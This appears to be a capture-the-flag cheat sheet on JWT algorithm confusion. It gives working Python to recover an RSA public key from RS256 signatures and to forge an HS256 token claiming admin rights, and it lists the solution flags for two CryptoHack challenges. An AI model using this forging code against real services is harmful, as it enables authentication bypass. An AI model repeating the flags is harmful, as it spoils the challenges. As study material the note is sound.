# JWT Algorithm Confusion (RS256 → HS256)

## When to use
- Server accepts BOTH RS256 and HS256 with the same key parameter
- Server uses a patched PyJWT that doesn't reject PEM public keys as HMAC secrets
- Goal: forge an HS256 token signed with the RSA public key bytes

## Part 1: Public key is known (e.g., /get_pubkey/ endpoint)

```python
pub = requests.get(f"{BASE}/get_pubkey/").json()["pubkey"]
pub_bytes = pub.encode()  # str → UTF-8 bytes
# forge HS256 token with pub_bytes as HMAC secret
```

## Part 2: Public key is unknown → recover from RS256 signatures

### Key insight
For RSA signature s on message m with modulus N:
```
s^e ≡ m (mod N)  →  N | (s^e - m)
```
With two independent signatures: `N = gcd(s1^e - m1, s2^e - m2)`

### Recovery steps
```python
import gmpy2

# For each RS256 JWT:
sig = int.from_bytes(b64url_decode(token.split('.')[2]), 'big')
m   = int.from_bytes(emsa_pkcs1_sha256(signing_input, k=256), 'big')
diff = gmpy2.mpz(sig)**65537 - gmpy2.mpz(m)

# GCD across diffs, then strip small primes
N = gcd(diff0, diff1, diff2)
for p in (2,3,5,7,11,13): 
    while N % p == 0: N //= p

# Verify: pow(sig, 65537, N) == m for all pairs
```

**Use gmpy2** — `s^65537` for 2048-bit s in pure Python takes 30+ min; gmpy2 (GMP) takes ~20s.

### EMSA-PKCS1-v1_5 for SHA-256
```python
SHA256_DIGEST_INFO = bytes.fromhex("3031300d060960864801650304020105000420")

def emsa_pkcs1_sha256(signing_input, k=256):
    digest = hashlib.sha256(signing_input).digest()
    T = SHA256_DIGEST_INFO + digest          # 51 bytes
    ps_len = k - len(T) - 3
    return b"\x00\x01" + b"\xff"*ps_len + b"\x00" + T
```

## Forging the HS256 token

```python
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

pub = RSAPublicNumbers(e=65537, n=N).public_key(default_backend())

# Use PKCS1 format (-----BEGIN RSA PUBLIC KEY-----)
pkcs1_pem = pub.public_bytes(
    serialization.Encoding.PEM,
    serialization.PublicFormat.PKCS1       # ← THIS is what servers typically use
)

header  = {"alg": "HS256", "typ": "JWT"}
payload = {"username": "admin", "admin": True}
h = b64url_encode(json.dumps(header,  separators=(",",":")).encode())
p = b64url_encode(json.dumps(payload, separators=(",",":")).encode())
sig = hmac.new(pkcs1_pem, f"{h}.{p}".encode(), hashlib.sha256).digest()
token = f"{h}.{p}.{b64url_encode(sig)}"
```

## Critical pitfalls

### PEM format: PKCS1 vs SPKI
- `-----BEGIN RSA PUBLIC KEY-----` (PKCS1, 426 bytes for 2048-bit) ← servers often use this
- `-----BEGIN PUBLIC KEY-----` (SPKI, 451 bytes for 2048-bit)
- **Always try both.** CryptoHack's rsa-or-hmac-2 uses PKCS1.

### pycryptodome `export_key("PEM", pkcs=1)` is broken for public keys
It returns SPKI format regardless of the `pkcs=1` argument.
**Use `cryptography` library instead** for reliable PEM generation:
```python
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
```

### Header field ordering
Match the captured RS256 token's header structure: `{"alg":"HS256","typ":"JWT"}` (alg first).

### Trailing newline variants
Try `pkcs1_pem`, `pkcs1_pem + b"\n"`, `pkcs1_pem.rstrip(b"\n")` if first attempt fails.

## Reference solves
- `cryptohack/Crypto on the Web/JSON Web Tokens/RSA or HMAC/solve.py` (Part 1)
- `cryptohack/Crypto on the Web/JSON Web Tokens/RSA or HMAC Part 2/debug_solve.py` (Part 2)

## Challenges
- CryptoHack: RSA or HMAC (35pts) — Flag: `crypto{Doom_Principle_Strikes_Again}`
- CryptoHack: RSA or HMAC? Part 2 (100pts) — Flag: `crypto{thanks_silentsignal_for_inspiration}`
